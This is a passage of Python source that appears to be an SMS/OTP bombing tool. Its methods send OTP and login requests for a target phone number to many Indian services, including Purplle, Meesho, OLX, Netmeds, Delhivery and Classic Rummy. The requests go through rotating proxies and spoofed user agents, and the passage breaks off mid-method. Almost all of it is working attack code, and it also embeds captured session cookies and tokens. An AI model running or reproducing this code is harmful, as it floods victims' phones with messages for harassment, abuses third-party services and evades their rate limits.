            'cookie': "csrftoken=5e8da98d426f5dfbe51e27a1ee970d16; _autm30d=null; session_initiated=Direct; _tmpsess=1; __uzma=629eb69176aac8.71227885; __uzmb=1654568593; __uzmc=905391024687; __uzmd=1654568593; environment=prod; is_robot=false; client_ip=43.248.34.6; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJ5QmtjTDdQQnF4aUZrWk5OSUgiLCJtb2RlX2RldmljZSI6ImRlc2t0b3AiLCJtb2RlX2RldmljZV90eXBlIjoid2ViIiwiaWF0IjoxNjU0NTY4NTkzLCJleHAiOjE2NjIzNDQ1OTMsImF1ZCI6IndlYiIsImlzcyI6InRva2VubWljcm9zZXJ2aWNlIn0.37ogWye7izJR0L7CUML80JmEyrcwlkhKcsBbWO5npKA; visitorppl=yBkcL7PBqxiFkZNNIH; device_id=yBkcL7PBqxiFkZNNIH; listingVers=listingV1; generic_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJLSXdZY1Z2Yzgwdld2QmV1TUoxMjcwMDExNTgwMjA1ODY3IiwibW9kZV9kZXZpY2UiOiJkZXNrdG9wIiwibW9kZV9kZXZpY2VfdHlwZSI6IndlYiIsImlhdCI6MTU4NDA4NjYzOCwiZXhwIjoyNjkwNjQ3NTI0LCJhdWQiOiJ3ZWIiLCJpc3MiOiJ0b2tlbm1pY3Jvc2VydmljZSJ9.RdrqkTAPBDh0Qe-605a_dOYoXOOPcJe33f6tuMioKi8; generic_visitorppl=KIwYcVvc80vWvBeuMJ1270011580205867; is_webview=false; mode_device=desktop; referrer=; utm_source=Direct; utm_medium=; utm_campaign=; gclid=; pclid=; fbclid=; session_initiator=Direct; is_first_session=true; sessionCreatedTime=1654568594; isSessionDetails=true; sendSiteVisitOnNextPageView=true; session_id=2a8da1595af7d4c4efc1bea7af8207dd; _gcl_au=1.1.2061605430.1654568594; _ga=GA1.2.181404065.1654568594; _gid=GA1.2.2007181958.1654568594; g_state={\"i_p\":1654576187674,\"i_l\":1}; sessionExpiryTime=1654570791",
            'authority': "www.purplle.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/x-www-form-urlencoded",
            'device_id': "yBkcL7PBqxiFkZNNIH",
            'dnt': "1",
            'referer': "https://www.purplle.com/login?next=profile",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'token': "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJ5QmtjTDdQQnF4aUZrWk5OSUgiLCJtb2RlX2RldmljZSI6ImRlc2t0b3AiLCJtb2RlX2RldmljZV90eXBlIjoid2ViIiwiaWF0IjoxNjU0NTY4NTkzLCJleHAiOjE2NjIzNDQ1OTMsImF1ZCI6IndlYiIsImlzcyI6InRva2VubWljcm9zZXJ2aWNlIn0.37ogWye7izJR0L7CUML80JmEyrcwlkhKcsBbWO5npKA",
            "user-agent": self.getUserAgent()
        }
        try:
            request = requests.request("GET", url, data=payload, headers=headers, params=querystring, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def openBook(self):
        url = "https://openbook-api.bankopen.co/mobile/users/register/otp"

        payload = "{\"username\":"f'"{self.user_mobile}"'"}"
        headers = {
            'cookie': "Path=%2F",
            'authority': "openbook-api.bankopen.co",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'dnt': "1",
            'origin': "https://web.openbook.co",
            'referer': "https://web.openbook.co/login?next=%2Fdashboard",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "cross-site",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'x-api-version': "3.1",
            'x-client-type': "Web"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def meesho(self):
        url = "https://meesho.com/api/v1/user/login/request-otp"

        payload = "{\"phone_number\":"f'"{self.user_mobile}"'"}"
        headers = {
            'authority': "meesho.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'cookie': "tk1Clid=undefined; _gcl_au=1.1.1572189097.1654568888; _ga=GA1.1.332013402.1654568888; WZRK_G=a018931b38cf4be3ab2ebf2d73030589; _ga_64C11X856M=GS1.1.1654568888.1.1.1654568892.0; _ga_ZB97HR591S=GS1.1.1654568890.1.1.1654568892.58; WZRK_S_48K-65W-Z75Z=%7B%22p%22%3A2%2C%22s%22%3A1654568891%2C%22t%22%3A1654568897%7D; mp_60483c180bee99d71ee5c084d7bb9d20_mixpanel=%7B%22distinct_id%22%3A%20%221813bfda7fd879-05265f815683e5-4b657f5c-1fa400-1813bfda7fe9d0%22%2C%22%24device_id%22%3A%20%221813bfda7fd879-05265f815683e5-4b657f5c-1fa400-1813bfda7fe9d0%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22%24user_id%22%3A%20%221813bfda7fd879-05265f815683e5-4b657f5c-1fa400-1813bfda7fe9d0%22%2C%22Is%20Anonymous%22%3A%20%22True%22%2C%22Session%20ID%22%3A%20%224290e0b4-13cf-4d2a-a8a3-99830084%22%2C%22last%20event%20time%22%3A%201654568902060%7D",
            'dnt': "1",
            'meesho-iso-country-code': "IN",
            'origin': "https://meesho.com",
            'referer': "https://meesho.com/auth?redirect=https%3A%2F%2Fmeesho.com%2F&source=profile&entry=header&screen=HP",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def eka(self):
        url = "https://auth.eka.care/auth/resend"

        payload = "{\"mobile\":"f'"{self.user_mobile}"'"}"
        headers = {
            'authority': "auth.eka.care",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'client-id': "doc-web",
            'content-type': "application/json",
            'cookie': "_gcl_au=1.1.1355876739.1654569406; _ga=GA1.1.1936787513.1654569406; _ga_JKBK7MFNEV=GS1.1.1654569405.1.0.1654569411.0; _hjSessionUser_2591420=eyJpZCI6IjYxNWVkNmZjLTdkY2EtNWFhYy05NmQwLTMyNDljMzUxYTVhZCIsImNyZWF0ZWQiOjE2NTQ1Njk0MTE4MTYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2591420=eyJpZCI6ImUzYTdmYjUxLTI2MTItNGFjYy05ZjNkLTViYWQ3MmQ2YmNkMiIsImNyZWF0ZWQiOjE2NTQ1Njk0MTIwMzEsImluU2FtcGxlIjp0cnVlfQ==; crisp-client%2Fsession%2F4c30fe75-b57c-4156-a5e4-58295a7880cf=session_3f077a65-3f23-41a9-b123-1b177ae952f6; mp_8801fa535d97939e4b9c500e5f0ddec9_mixpanel=%7B%22distinct_id%22%3A%20%221813c05a54ef6-00c9610bf35c5e-15373079-1fa400-1813c05a54fd32%22%2C%22%24device_id%22%3A%20%221813c05a54ef6-00c9610bf35c5e-15373079-1fa400-1813c05a54fd32%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fdr.eka.care%2Fapp%22%2C%22%24initial_referring_domain%22%3A%20%22dr.eka.care%22%7D",
            'dnt': "1",
            'origin': "https://dr.eka.care",
            'referer': "https://dr.eka.care/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            "user-agent": self.getUserAgent()
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def old(self):
        url = "https://www.olx.in/api/auth/authenticate"

        querystring = {"lang": "en-IN"}
        payload = "{\"grantType\":\"phone\",\"phone\":"f'"{self.user_mobile}"'",\"language\":\"en-IN\"}"
        headers = {
            'cookie': "lqonap=1813c1be554x542d3d0a; laquesis=pan-59446@b#pan-60601@b; laquesisff=pan-36788#pan-38000#pan-42665; lqstatus=1654572070; bm_sz=479AD855001B2BAAD2977B4AEBAE31DE~YAAQn/hWuMsgwzeBAQAAKucbPBCjgWjGz7O9ymrtzTbNLTtJUP0qP8gW2YLG2LoH140ZVidDTTHP3K4PfQ6gcynWG5j67zKzu2b7MZebBiEyL51cOVsN7VrjXmhhuePiPOY6WkNbt9xP84wF7VziLRYgKExU3N+jzN0dmZwaQWVGe13iBSe8VGltuwayc7Ca94MwqFMybwkbhS/fR1coLWzS92qzUDMQ7UfC6l+q4VED3ZEGTZQNUKW4xjfTV2X/9HeRfyv6VoPFqYLp/kK5XdmczaNSWUsxAzv+/m002A==~3158070~3160370; ak_bmsc=C888B111D0FEFF127FAFB6D85AB9384E~000000000000000000000000000000~YAAQn/hWuPcgwzeBAQAA/u0bPBDbu72L3PEwiG7WnkIPLWwGa+iLAIW6yEZ/prb+RKw9KTGmBlI4tGvGAGEcb5MXuZa49X0mxvfa9XzsAI/M3DDzSSyx8YmBzdssuowg4EA/l/qrykGNdLM76w1K4nYntTIE65NRbHQ/K3ME+4CdP1lvxZr4Ihv4FuS8hA03jvc5CMGZdKyRrMwRJHGIsSfM2vE1Xcj8mCrTYVtJEReaKQguERQp2MJxiNBCtaZopEB3NfAck+SDxmnaLLEzNw9jS4Unh7C2QpkKh06LcFVmaHnOdWAsS1uVfvIGBQSiKLnUMhH1MjGsP6+7nHqrf5qA44GLAuIwsGlM+O14VYOSx2LJ1LS7k700AjVMrhfPly+GnLgPNIfsX/S24vgtbTP3JeoVrlf/hT4B1mt5U2eeHAIE+Ys3Jhi/1F/TIGBXIXXcWedQUTAw7pjFF1dZFzbld1OjdGN5tgNzza7qXCuUFJGgKJdfXiQ=; _abck=91F415F48AD0C8F9523A83EF0C9341B7~0~YAAQn/hWuDkhwzeBAQAAqfwbPAgwOqnIDpNXjIy0KgsrXpufzoTZq9gyGwUwcfl0P6j63sfNdQrzQI3M3mOU02lsQ89H1dS0gc3wCTeCocytn86EJnTyKbfK1bN1U6JdJ2BukgVVeIAolwc9FaVQS59Cp7O62WskowogrtNxEMSlo2gAMCrJjr7LYXtmbeV83CClolbboCh4jtXk9cV+jr1xgr6fWkzM1Ww6rR2qrxA6T74pql9MwvfEpN48MPFksKHOwFKIc8KUAIjUM8JZ8g4QFHYy/U+PD0bza3IBkm9FISuJifPfy9pQtI8h7KAKAEm1ofJOKo+9pXxs9wx8eZXaj0Hp2q7NNMe1+y5DladlwMBSKZ7keLzStl/ekwrzj3IY+hPXuwXnX7CrjsJejN79nbc=~-1~||-1||~-1; g_state={\"i_p\":1654578077713,\"i_l\":1}; G_ENABLED_IDPS=google; bm_sv=401D1516221E4DA25DE42FC074189694~YAAQn/hWuNwiwzeBAQAAWCkcPBA8Ii6R/ISyuJywGQK2TcVaoNgpPpWCyiukbXgZf8ekif8WxICpsTPVOYFAV1B3Pq1AgG+NxY6bvDb1XMpHeNHJQSLnzsv/vY8VbSzZFBfRzIIMtBtxjvDoiF1wMLmasPKOA6zqfF3J3kKlc/WrSkaWyQSSPUzDJDo5Rqz/Sak+7BW6E2ZTnV/iWzSfFthMdPDAaE5u6Uv4JaaDro9aeHsMNlI/12f2EB/vH6+8~1",
            'authority': "www.olx.in",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/json",
            'dnt': "1",
            'origin': "https://www.olx.in",
            'referer': "https://www.olx.in/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent(),
            'x-newrelic-id': "VQMGU1ZVDxABU1lbBgMDUlI=",
            'x-panamera-fingerprint': "5b11d8411c6795feaaed58c0f5c6f034#1654570871207"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def netmeds(self):
        url = f"https://m.netmeds.com/mst/rest/v1/id/details/f{self.user_mobile}"

        payload = ""
        headers = {
            'authority': "m.netmeds.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en-US,en;q=0.9",
            'cookie': "_nmsAttr=ADW-CPC-Search-NMS-Brand-NC; _nmsSource=ADW-CPC-Search-NMS-Brand-NC; _nmsMedium=CPC; _nmsCampaign=ADW-CPC-Search-NMS-Brand-NC; _nmsUTMtrackingsource=ADW-CPC-Search-NMS-Brand-NC%26ADW-CPC-Search-NMS-Brand-NC%26CPC%26ADW-CPC-Search-NMS-Brand-NC; _nmstracking=ADW-CPC-Search-NMS-Brand-NC; _ALGOLIA=anonymous-26efba08-3a50-45ca-9bc8-9669a6e032b7; _gcl_aw=GCL.1654570457.CjwKCAjwy_aUBhACEiwA2IHHQFC9wdAdVdN13-AsEtt92vpCazF9gu7QosyIhHttIahwcfS9IW2Z4hoC1msQAvD_BwE; _gcl_au=1.1.2112317680.1654570457; nms_mgo_pincode=110002; nms_mgo_city=Central%20Delhi; nms_mgo_state_code=DL; nms_mgo_state_name=Delhi; _ga=GA1.3.891037540.1654570457; _gid=GA1.3.838617024.1654570457; _gat_UA-63910444-1=1; _gid=GA1.2.838617024.1654570457; _gac_UA-63910444-1=1.1654570458.CjwKCAjwy_aUBhACEiwA2IHHQFC9wdAdVdN13-AsEtt92vpCazF9gu7QosyIhHttIahwcfS9IW2Z4hoC1msQAvD_BwE; _gac_UA-63910444-1=1.1654570458.CjwKCAjwy_aUBhACEiwA2IHHQFC9wdAdVdN13-AsEtt92vpCazF9gu7QosyIhHttIahwcfS9IW2Z4hoC1msQAvD_BwE; _gat=1; liteprompt=disabled; _uetsid=1ef357c0e60d11ec98f3bfaec136b2f9; _uetvid=1ef3e6c0e60d11ec86c397e1ca7bf06e; _ga_ZD1BC704WF=GS1.1.1654570456.1.1.1654570481.35; G_ENABLED_IDPS=google; _ga=GA1.2.891037540.1654570457",
            'dnt': "1",
            'referer': "https://m.netmeds.com/customer/account/login",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            "user-agent": self.getUserAgent()
        }
        try:
            request = requests.request("GET", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def delhivery(self):
        url = f"https://dlv-api.delhivery.com/client-profile/otp/generate/+91f{self.user_mobile}"

        payload = ""
        headers = {
            'authority': "dlv-api.delhivery.com",
            'accept': "application/json, text/plain, */*",
            'accept-language': "en",
            'dnt': "1",
            'origin': "https://www.delhivery.com",
            'referer': "https://www.delhivery.com/",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-site",
            "user-agent": self.getUserAgent()
        }
        try:
            request = requests.request("GET", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def classicRummy(self):
        url = "https://www.classicrummy.com/system/ajax"
        payload = f"mobile_number={self.user_mobile}&form_build_id=form-f2qL4Ts8iczLvHFU97qun6myVE80t27QYNqkhnD9fTU&form_id=janus_misc_mobile_download_form&_triggering_element_name=op&_triggering_element_value=Text%2Bme%2Blink&ajax_html_ids%255B%255D=mainContainer&ajax_html_ids%255B%255D=headerComponent&ajax_html_ids%255B%255D=block-panels-mini-header-panel&ajax_html_ids%255B%255D=mini-panel-header_panel&ajax_html_ids%255B%255D=logo&ajax_html_ids%255B%255D=header-login&ajax_html_ids%255B%255D=user-login-form&ajax_html_ids%255B%255D=user-login-block-container&ajax_html_ids%255B%255D=user-login-block-form-fields&ajax_html_ids%255B%255D=edit-name&ajax_html_ids%255B%255D=edit-pass&ajax_html_ids%255B%255D=edit-submit&ajax_html_ids%255B%255D=edit-actions--2&ajax_html_ids%255B%255D=disremember&ajax_html_ids%255B%255D=menu-icon&ajax_html_ids%255B%255D=m-menu&ajax_html_ids%255B%255D=mobile-logo&ajax_html_ids%255B%255D=mobile-logo-button&ajax_html_ids%255B%255D=mainComponent&ajax_html_ids%255B%255D=contentContainer&ajax_html_ids%255B%255D=menuContainer&ajax_html_ids%255B%255D=navComponent&ajax_html_ids%255B%255D=block-system-main-menu&ajax_html_ids%255B%255D=support-menu&ajax_html_ids%255B%255D=block-block-35&ajax_html_ids%255B%255D=content&ajax_html_ids%255B%255D=main-content&ajax_html_ids%255B%255D=page-title&ajax_html_ids%255B%255D=page-content&ajax_html_ids%255B%255D=forgot-pass-wrapper&ajax_html_ids%255B%255D=block-janus-player-password-forgot-password-form&ajax_html_ids%255B%255D=user-pass&ajax_html_ids%255B%255D=edit-name--2&ajax_html_ids%255B%255D=edit-actions--3&ajax_html_ids%255B%255D=edit-submit--2&ajax_html_ids%255B%255D=block-block-59&ajax_html_ids%255B%255D=mobile-download-form-wrapper&ajax_html_ids%255B%255D=janus-misc-mobile-download-form&ajax_html_ids%255B%255D=app-download-mobile-number&ajax_html_ids%255B%255D=edit-actions--6&ajax_html_ids%255B%255D=text-me-link-button&ajax_html_ids%255B%255D=block-block-145&ajax_html_ids%255B%255D=block-block-146&ajax_html_ids%255B%255D=footer&ajax_html_ids%255B%255D=block-panels-mini-footer-new&ajax_html_ids%255B%255D=mini-panel-footer_new&ajax_html_ids%255B%255D=footer-icons-row&ajax_html_ids%255B%255D=block-block-44&ajax_html_ids%255B%255D=block-block-55&ajax_html_ids%255B%255D=block-block-32&ajax_html_ids%255B%255D=block-block-63&ajax_html_ids%255B%255D=scroll&ajax_html_ids%255B%255D=block-menu-menu-mobile-menu&ajax_html_ids%255B%255D=pro-app-login-menu&ajax_html_ids%255B%255D=block-block-46&ajax_html_ids%255B%255D=&ajax_page_state%255Btheme%255D=classicrummy&ajax_page_state%255Btheme_token%255D=PB6XRIz-CJlvS52RdoZSb0311T5ohPa-L20-NTmrolw&ajax_page_state%255Bcss%255D%255Bmodules%252Fsystem%252Fsystem.base.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fsystem%252Fsystem.menus.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fsystem%252Fsystem.messages.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fsystem%252Fsystem.theme.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.core.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.theme.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.button.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.resizable.css%255D=1&ajax_page_state%255Bcss%255D%255Bmisc%252Fui%252Fjquery.ui.dialog.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fcomment%252Fcomment.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fdate%252Fdate_api%252Fdate.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fdate%252Fdate_popup%252Fthemes%252Fdatepicker.1.7.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Ffield%252Ftheme%252Ffield.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fnode%252Fnode.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fsearch%252Fsearch.css%255D=1&ajax_page_state%255Bcss%255D%255Bmodules%252Fuser%252Fuser.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fviews%252Fcss%252Fviews.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fctools%252Fcss%252Fctools.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fctools%252Fcss%252Fmodal.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fmodal_forms%252Fcss%252Fmodal_forms_popup.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fpanels%252Fcss%252Fpanels.css%255D=1&ajax_page_state%255Bcss%255D%255Bpublic%253A%252F%252Fctools%252Fcss%252Fa94005f3b3faf8b5f805bee88c8ddd8c.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fpanels%252Fplugins%252Flayouts%252Fflexible%252Fflexible.css%255D=1&ajax_page_state%255Bcss%255D%255Bpublic%253A%252F%252Fctools%252Fcss%252Fc666ced32588108b7d69c92ac0646471.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fall%252Fmodules%252Fresponsive_menus%252Fstyles%252Fresponsive_menus_simple%252Fcss%252Fresponsive_menus_simple.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fsystem.menus.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fmaterial.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fdefault.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Ffrontpage.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fnavigation.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252FmCustomScrollbar.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fmain.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fcashier.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fcontent.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fpromotions.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Ftablet.css%255D=1&ajax_page_state%255Bcss%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fcss%252Fmobile.css%255D=1&ajax_page_state%255Bjs%255D%255B0%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fjquery%252F1.7%252Fjquery.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fjquery-extend-3.4.0.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fjquery-html-prefilter-3.5.0-backport.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fjquery.once.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fdrupal.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.core.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.widget.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fexternal%252Fjquery.cookie.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fmisc%252Fjquery.form.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fjquery-ajaxsubmit.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.button.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.mouse.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.draggable.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.position.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.resizable.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Freplace%252Fui%252Fui%252Fminified%252Fjquery.ui.dialog.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fdialog%252Fmisc%252Fajax.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fjquery_update%252Fjs%252Fjquery_update.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fmodal_forms%252Fjs%252Fmodal_forms_login.js%255D=1&ajax_page_state%255Bjs%255D%255Bmisc%252Fprogress.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fctools%252Fjs%252Fmodal.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fmodal_forms%252Fjs%252Fmodal_forms_popup.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fcustom%252Fjanus_geoip_location%252Fjanus_geoip_location_non_logged_in.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fall%252Fmodules%252Fresponsive_menus%252Fstyles%252Fresponsive_menus_simple%252Fjs%252Fresponsive_menus_simple.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Fmaterial.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252FmCustomScrollbar.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252FmaterialInput.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Frummy.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Fmenu.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Fresponsiveslides.min.js%255D=1&ajax_page_state%255Bjs%255D%255Bsites%252Fclassicrummy.com%252Fthemes%252Fclassicrummy%252Fjs%252Fjquery.bxslider.js%255D=1&ajax_page_state%255Bjquery_version%255D=1.7"
        headers = {
            'authority': "www.classicrummy.com",
            'accept': "application/json, text/javascript, */*; q=0.01",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'cookie': "SSESS1fdfcf5c80973e7d4bd24919e70fdb5b=gvS7RgeOO1x72oDtzpqBMYUZFGn3c0Y53bksRHgiiT0; _gcl_au=1.1.1901828536.1654657153; has_js=1; geolocation_status_flag=; _ga=GA1.1.1135017572.1654657153; _ga_7BVTR4SXQZ=GS1.1.1654657152.1.1.1654657164.48",
            'dnt': "1",
            'origin': "https://www.classicrummy.com",
            'referer': "https://www.classicrummy.com/play-rummy-games-on-mobile",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
            'x-requested-with': "XMLHttpRequest"
        }
        try:
            request = requests.request("POST", url, data=payload, headers=headers, proxies={
                'https': self.getproxy()})
        except:
            return False
        if(request.status_code == 200):
            return True

    def classicRummy2(self):
        url = "https://www.classicrummy.com/mobile_generate_otp"
        payload = f"mobile={self.user_mobile}"
        headers = {
            'authority': "www.classicrummy.com",
            'accept': "*/*",
            'accept-language': "en-US,en;q=0.9",
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'cookie': "SSESS1fdfcf5c80973e7d4bd24919e70fdb5b=gvS7RgeOO1x72oDtzpqBMYUZFGn3c0Y53bksRHgiiT0; _gcl_au=1.1.1901828536.1654657153; has_js=1; geolocation_status_flag=; _ga=GA1.1.1135017572.1654657153; _ga_7BVTR4SXQZ=GS1.1.1654657152.1.1.1654657284.60",
            'dnt': "1",
            'origin': "https://www.classicrummy.com",
            'referer': "https://www.classicrummy.com/register",
            'sec-fetch-dest': "empty",
            'sec-fetch-mode': "cors",
            'sec-fetch-site': "same-origin",
            'user-agent': "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Mobile Safari/537.36 Edg/102.0.1245.33",
